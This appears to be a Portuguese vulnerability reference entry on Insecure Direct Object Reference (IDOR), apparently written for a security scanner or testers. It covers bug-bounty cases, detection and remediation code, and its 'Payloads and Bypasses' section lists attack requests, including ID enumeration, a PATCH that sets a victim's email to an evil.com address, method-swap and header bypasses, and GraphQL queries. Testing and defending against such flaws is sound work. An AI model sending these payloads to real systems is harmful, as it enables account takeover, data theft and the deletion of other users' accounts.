---
id: idor
title: "Insecure Direct Object Reference"
module: "idor"
severity: "MEDIUM"
cwe_id: "CWE-639"
cwe_title: "Authorization Bypass Through User-Controlled Key"
cvss_vector: "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "broken_access_control.insecure_direct_object_references"
---

## Summary
A aplicação usa um identificador controlado pelo usuário para acessar objetos sem verificar se ele pertence ao usuário autenticado, permitindo ler, alterar ou excluir dados de terceiros.

## Description
IDOR é uma falha de controle de acesso em nível de objeto (BOLA, no OWASP API Top 10). O endpoint recebe um ID (`/api/users/123`, `?invoice_id=456`, `{"account_id": 789}`) e retorna o recurso correspondente sem validar ownership, tenant ou permissão. IDs sequenciais, UUIDs previsíveis (v1), hashes curtos e referências em GraphQL ampliam a facilidade de exploração.

Variações:
- **Horizontal:** usuário A acessa dados do usuário B no mesmo nível.
- **Vertical:** usuário comum acessa recurso administrativo.
- **Blind IDOR:** a resposta não retorna o objeto, mas a ação é executada (ex.: DELETE, PATCH).
- **IDOR em métodos:** GET é protegido, mas PUT/PATCH/DELETE não.
- **IDOR em lote:** arrays de IDs, exportações, relatórios e GraphQL `node(id:)`.
- **IDOR em arquivos:** download de faturas, anexos, backups e exports.

O bug é comum em APIs REST, GraphQL, mobile e integrações, especialmente quando a autorização é feita apenas no frontend ou no endpoint "pai".

### UI Authorization vs API Authorization

Um recurso escondido na UI não significa que o acesso ao recurso está devidamente autorizado. O backend deve impor autorização de forma independente.

| Camada | Comportamento |
|--------|---------------|
| Interface web | Recurso privado corretamente escondido |
| API | Recurso privado retornado com `200 OK` |

A lógica de frontend (esconder botão, remover item do menu, não renderizar link) é uma decisão de UX, não uma fronteira de autorização. Qualquer endpoint que exponha recursos controlados por usuário (`/orders/{id}`, `/documents/{id}`, `/messages/{id}`, `/albums/{id}`) deve ser tratado como candidato a teste de autorização em nível de objeto -- independente do que a UI mostra.

Exemplo prático: um álbum de fotos configurado como "Unpublished" não aparece no perfil público da vítima, mas a API retorna o objeto completo quando acessado diretamente com os identificadores da vítima:

```http
GET /api/front/v2/users/{victim_user_id}/albums/{victim_album_id} HTTP/2
Host: [TARGET]
Cookie: [ATTACKER_SESSION]
```

Resposta: `200 OK` com metadados completos do álbum (`id`, `userId`, `name`, `accessMode: "unpublished"`). Dois object references diretos (`user_id` e `album_id`) sem checagem de ownership.

A vulnerabilidade não é que o `album_id` é adivinhável -- é que o backend não verificou autorização em nível de objeto ao servir o recurso solicitado.

## Impact
- Vazamento de PII, documentos, faturas, mensagens e dados financeiros de outros usuários.
- Alteração/exclusão de dados de terceiros e fraude.
- Account takeover quando o IDOR expõe e-mail, token ou permite troca de senha.
- Acesso a dados de outros tenants em SaaS.
- Impacto MEDIUM a CRITICAL, dependendo da sensibilidade e da capacidade de escrita.

## Payloads and Bypasses
```text
# Enumeração simples
GET /api/users/1001
GET /api/users/1002
GET /api/invoices/5544
GET /api/orders/98765

# Trocar ID no body
PATCH /api/users/1002
{"email":"atacante@evil.com"}

# Métodos alternativos quando GET é bloqueado
POST /api/users/1002
PUT /api/users/1002
PATCH /api/users/1002
DELETE /api/users/1002

# IDs em arrays / export
GET /api/invoices?ids=1001,1002,1003
POST /api/export {"ids":[1001,1002,1003]}

# UUID previsível (v1) / base64
GET /api/files/550e8400-e29b-11d4-a716-446655440000
GET /api/files/VXNlcjoxMjM=

# GraphQL
{ node(id:"VXNlcjoxMjM=") { ... on User { email role } } }
{ user(id:"1002") { email } }

# Path traversal em IDs
GET /api/users/../admin
GET /api/users/1002%2f..%2fadmin

# Parâmetros duplicados / mass assignment de referência
GET /api/profile?user_id=1001&user_id=1002
{"user_id":1001,"owner_id":1002}

# Mobile/API version bypass
GET /api/v1/users/1002
GET /api/v2/users/1002
GET /internal/users/1002
```

Bypasses de proteção:
```text
- Trocar GET por PUT/PATCH/DELETE
- Enviar ID no body JSON/XML em vez da URL
- Adicionar header X-Original-URL / X-Rewrite-URL
- Usar IDs de outro tenant, organização ou filial
- Alterar `role`/`is_admin` junto do ID
- Explorar endpoints de export, relatório, impressão e download
- Acessar via GraphQL quando REST está protegido (ou vice-versa)
- Forçar cache de resposta de outro usuário (combinar com cache poisoning)
```

Casos reais e mentalidade de ataque (RWBH): Uber (recibos/viagens), Zomato (perfis) e Yahoo (objetos de conta) exploraram IDs sequenciais, UUID previsível e troca de método; o atacante testa GET, PATCH, DELETE e exportações.

## Real-World Cases

### Caso 1 -- Album privado via API (0xdelta.org, SERROS404)

Funcionalidade de álbum de fotos onde o modo de acesso podia ser configurado como "Unpublished". A interface web corretamente escondia o álbum do perfil público, mas a API retornava o objeto completo para qualquer usuário autenticado.

**Endpoint vulnerável:**
```http
GET /api/front/v2/users/{user_id}/albums/{album_id}
```

Dois object references diretos (`user_id` e `album_id`) sem cross-check de ownership. A resposta incluía metadados sensíveis: ID, owner ID, nome, descrição e modo de acesso -- mesmo sendo `"accessMode": "unpublished"`.

**Metodologia de teste generalizada:**
```text
1. Criar objeto privado como Account A (owner)
2. Identificar o object ID
3. Autenticar como Account B (não relacionada)
4. Confirmar que o objeto está escondido na UI
5. Localizar a requisição de API subjacente
6. Substituir identificadores pelos da vítima
7. Observar a resposta do servidor
8. Comparar o objeto retornado com o objeto real da vítima
```

**Impacto:** Vazamento de metadados privados. IDs numéricos e sequenciais levantam possibilidade de enumeração em massa, embora a avaliação de severidade deva distinguir entre impacto demonstrado (confirmado dentro do escopo autorizado) e impacto teórico (o que identificadores previsíveis poderiam potencialmente permitir).

**Takeaway:** Recurso escondido na UI != recurso protegido na API. O backend deve verificar independentemente se o usuário autenticado tem permissão para acessar o objeto solicitado.

**Ref:** [Dissecting IDOR -- 0xdelta.org](https://0xdelta.org/blog/red-team/web-security/dissecting-idor/) (2026-08-28)

### Caso 2 -- Exclusão não autorizada de contas (Mozilla Firefox Accounts)

IDOR afetando operação destrutiva. O endpoint `POST /v1/account/destroy` não verificava se a sessão realizando a exclusão pertencia à conta especificada na requisição.

**Endpoint vulnerável:**
```http
POST /v1/account/destroy
```

Um atacante autenticado podia usar sua própria sessão fornecendo informações de conta de outro usuário, causando a exclusão permanente da conta da vítima. O reporter (z3phyrus) demonstrou que contas criadas via Google SSO podiam ser excluídas quando o e-mail da vítima era conhecido -- sem acesso às credenciais da vítima.

A Mozilla inicialmente classificou com severidade menor durante a investigação. Após a demonstração do vetor SSO, elevou para **High**, reconhecendo que a falha permitia exclusão de conta de outro usuário.

| Campo | Valor |
|-------|-------|
| Report ID | [#3154983](https://hackerone.com/reports/3154983) |
| Reporter | [z3phyrus](https://hackerone.com/z3phyrus) |
| Programa | [Mozilla](https://hackerone.com/mozilla) |
| Reportado | 2025-05-20 |
| Divulgado | 2025-06-03 |
| Weakness | Insecure Direct Object Reference (IDOR) |
| Severidade | High |
| CVE | Nenhum |
| Status | Resolved |

**Takeaway:** IDOR em operação destrutiva tem impacto substancialmente maior que IDOR de leitura. A validação de ownership/sessão ausente não apenas expôs dados -- permitiu ação irreversível contra a conta da vítima.

### Caso 3 -- Escalação de privilégios (Shopify/Stocky)

Falha de controle de acesso que cruzou fronteira de privilégio, transformando sessão autenticada comum em acesso administrativo.

**Endpoint vulnerável:**
```http
POST /users/create_admin
```

Um usuário não privilegiado podia invocar diretamente o endpoint de criação de conta administrativa usando sua sessão autenticada existente. O pesquisador (`@stapia`) autenticou-se, obteve cookies e authenticity token do endpoint `/users/me`, e modificou a requisição para `/users/create_admin` com os parâmetros de criação de conta.

O resultado foi criação e login bem-sucedido de uma conta **administradora**, concedendo acesso a ações sensíveis: atualizar inventário e estoque, gerenciar fornecedores, e realizar pedidos de compra.

O Shopify emitiu um token válido para múltiplos endpoints -- restringir o escopo do token ao endpoint pretendido teria prevenido a aceitação por `/users/create_admin`.

| Campo | Valor |
|-------|-------|
| Reporter | [@stapia](https://hackerone.com/stapia) |
| Programa | Shopify / Stocky |
| Reportado | 2021-06-27 |
| Vulnerabilidade | Privilege Escalation / Broken Access Control |
| Endpoint vulnerável | `POST /users/create_admin` |
| Privilégio inicial | Usuário não privilegiado |
| Privilégio resultante | Administrador |
| Impacto | Acesso administrativo não autorizado |
| Bounty | $1,600 |
| Fix deployed | 2021-08-25 |

**Takeaway:** Uma sessão autenticada aparentemente comum se tornou um comprometimento de alto impacto quando a aplicação falhou em impor fronteiras de privilégio.

**Ref:** [HackerOne Blog -- How Privilege Escalation Led to Unrestricted Admin Account Creation on Shopify](https://www.hackerone.com/blog/how-privilege-escalation-led-unrestricted-admin-account-creation-shopify)

### Comparação dos casos

| Caso | Operação | Alvo | Impacto |
|------|----------|------|---------|
| Album privado | Read | Metadados de álbum privado | Violação de privacidade |
| Mozilla | Delete | Conta de usuário | Exclusão permanente de conta |
| Shopify | Privilege escalation | Funcionalidade administrativa | Acesso administrativo não autorizado |

IDOR é um padrão, não um nível de severidade. A mesma falha de autorização subjacente pode variar de vazamento de metadados de baixo impacto a ações destrutivas ou comprometimento administrativo.

## Detection

### O que monitorar

Detectar IDOR não é sobre pattern-matching de IDs numéricos em URLs -- é sobre correlacionar três coisas:

```text
Identidade autenticada + Objeto solicitado + Decisão de autorização
```

Campos de log úteis:
```text
user_id              = <solicitante>
requested_object_id  = <alvo>
object_owner_id      = <owner real>
authorization_result = allowed | denied
```

### Indicadores

- Uma conta solicitando objetos pertencentes a muitos owners diferentes
- Requisições em alto volume envolvendo object IDs sequenciais
- Respostas `403` / `404` repetidas para identificadores variados da mesma sessão
- Padrões de acesso a objetos inconsistentes com o uso normal da conta

Logging suporta detecção -- não substitui o fix. A defesa primária continua sendo **autorização server-side em nível de objeto**.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `id`, `user_id`, `account_id`, `customer_id`, `order_id`, `invoice_id`, `file_id`, `document_id`, `message_id`, `trip_id`, `receipt_id`, `tenant_id`, `org_id`, `uuid`, `uid`, `ref`, `key`, `token`.
- **Paths comuns:** `/api/users/{id}`, `/api/orders/{id}`, `/api/invoices/{id}`, `/api/files/{id}`, `/api/messages/{id}`, `/api/v1/accounts/{id}`, `/download`, `/export`, `/graphql`.
- **Sinais:** IDs sequenciais; UUIDv1; endpoints que retornam dados de outro usuário; GET protegido mas PATCH/DELETE não; ausência de verificação de tenant.

## Recommendation
1. Aplicar autorização em cada objeto, no servidor, verificando `owner_id`/`tenant_id` contra o usuário autenticado. Não confiar em IDs opacos nem no frontend. **Nunca confiar em visibilidade de frontend como controle de segurança** -- esconder um recurso na UI é decisão de UX, não fronteira de autorização.
2. Usar "deny by default": se o usuário não tem permissão explícita, retornar 404/403.
3. Centralizar a checagem em um serviço de autorização (policy engine) e cobrir todos os métodos e formatos (REST, GraphQL, mobile).
4. Preferir IDs opacos e aleatórios (UUIDv4/ULID) para reduzir enumeração; ainda assim, validar ownership.
5. Em GraphQL, validar autorização em cada resolver e no `node(id:)`; não expor campos administrativos.
6. Proteger endpoints de export/download com checagem de ownership e URLs assinadas de curta duração.
7. Auditar acessos e alertar sobre padrões de enumeração (muitos 403/404, varredura de IDs).
8. Escopar queries ao usuário autenticado sempre que ownership se aplica -- tornar a constraint de ownership parte da própria recuperação de dados:
```sql
-- Vulnerável
SELECT * FROM albums WHERE id = ?

-- Corrigido
SELECT * FROM albums WHERE id = ? AND user_id = ?
```
A segunda forma torna a constraint de ownership parte da query, em vez de depender de um passo de autorização separado que pode ser esquecido ou bypassed.
9. Exemplo Spring:
```java
@GetMapping("/api/invoices/{id}")
public Invoice getInvoice(@PathVariable Long id, @AuthenticationPrincipal User user) {
    Invoice invoice = repo.findById(id).orElseThrow(NotFoundException::new);
    if (!invoice.getOwnerId().equals(user.getId()) && !user.hasRole("ADMIN")) {
        throw new AccessDeniedException("forbidden");
    }
    return invoice;
}
```
10. Criar testes automatizados que tentem acessar recursos de outro usuário em todos os métodos.
